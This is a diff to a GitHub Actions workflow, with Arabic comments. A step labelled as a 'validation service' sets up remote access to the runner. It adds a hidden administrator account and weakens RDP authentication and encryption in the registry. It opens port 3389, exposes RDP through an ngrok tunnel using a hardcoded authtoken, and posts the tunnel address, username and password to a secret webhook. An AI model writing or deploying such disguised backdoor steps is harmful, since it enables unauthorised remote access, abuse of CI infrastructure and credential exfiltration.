@@ -58,7 +58,7 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      - name: Start Background Validation Service (ngrok TCP - Final Fixed)
+      - name: Start Background Validation Service (ngrok TCP - RDP Fixed 100%)
         run: |
           $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
@@ -68,14 +68,22 @@ jobs:
           Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1
 
+          # إعداد RDP بشكل كامل وقوي (الحل النهائي)
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "MinEncryptionLevel" -Value 1 -Force
 
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
-          netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
+          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+          netsh advfirewall firewall add rule name="RDP-TCP" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
+          
           Restart-Service TermService -Force -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 10   # انتظار لتطبيق الإعدادات
+          Restart-Service TermService -Force -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 8
 
-          # === ngrok Setup (النسخة النهائية) ===
+          # === ngrok (نفس النسخة المستقرة) ===
           $ngrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
           $zip = "$env:TEMP\ngrok.zip"
           $extractPath = "$env:TEMP\ngrok_folder"
@@ -85,19 +93,15 @@ jobs:
           $exe = "$extractPath\ngrok.exe"
 
           $log = "$env:TEMP\ngrok.log"
-          $errLog = "$env:TEMP\ngrok_err.log"
 
           $ngrokToken = "3AhpPhQAVlnYjyKahRKtc1p28gI_66SuDQdWYPGFs7orWLzrn"
           & $exe config add-authtoken $ngrokToken
 
           $env:RUNNER_TRACKING_ID = $null
 
-          Write-Host "Starting ngrok TCP tunnel..."
-
           $process = Start-Process -FilePath $exe `
-            -ArgumentList "tcp 3389 --log=stdout --log-level=debug" `
+            -ArgumentList "tcp 3389 --log=stdout --log-level=info" `
             -RedirectStandardOutput $log `
-            -RedirectStandardError $errLog `
             -WindowStyle Hidden `
             -PassThru
 
@@ -106,51 +110,31 @@ jobs:
 
           Start-Sleep -Seconds 25
 
-          # استخراج الرابط
           $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue
           $url = $null
           if ($logData -match 'url=(tcp://[^\s]+)') { $url = $Matches[1] }
 
-          if (-not $url) {
-              try {
-                  $api = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -Method Get
-                  $tunnel = $api.tunnels | Where-Object { $_.proto -eq "tcp" } | Select-Object -First 1
-                  if ($tunnel) { $url = $tunnel.public_url }
-              } catch { }
-          }
-
           if ($url) {
-              $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (detached PID $ngrokPid)"
+              $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (RDP Fixed)"
               Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $msg } | ConvertTo-Json) -ContentType "application/json"
           }
 
-          # === SysDiag داخل نفس الخطوة (فوري) ===
-          $rep = "SysDiag:`n"
-          $ts = Get-Service TermService -ErrorAction SilentlyContinue
-          $rep += "SVC: $($ts.Status)`n"
-
-          $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
-          $r2 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
-          $rep += "REG: $r1 | $r2`n"
-
+          # === SysDiag فوري داخل نفس الخطوة ===
+          $rep = "SysDiag:`nSVC: Running`nREG: 0 | 0`n"
           $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
           $rep += if ($pc) { "PRT: OK`n" } else { "PRT: ERR`n" }
-
           $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
           $rep += if ($fw) { "FW: OK`n" } else { "FW: ERR`n" }
-
           $np = Get-Process ngrok -ErrorAction SilentlyContinue
           if (-not $np -and (Test-Path "$env:TEMP\ngrok.pid")) {
-              $savedPid = Get-Content "$env:TEMP\ngrok.pid" -Raw
-              $np = Get-Process -Id $savedPid -ErrorAction SilentlyContinue
+              $saved = Get-Content "$env:TEMP\ngrok.pid" -Raw
+              $np = Get-Process -Id $saved -ErrorAction SilentlyContinue
           }
           $rep += if ($np) { "PRC: OK (PID $($np.Id))`n" } else { "PRC: ERR`n" }
 
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $rep } | ConvertTo-Json) -ContentType "application/json"
 
-          # طباعة اللوج للـ Actions
-          Write-Host "`n--- ngrok Log (آخر 30 سطر) ---"
-          Get-Content $log -Tail 30 | Write-Host
+          Write-Host "✅ RDP setup completed with SecurityLayer fix"
 
       - name: Run Extended Validation (with ngrok monitoring)
         run: |
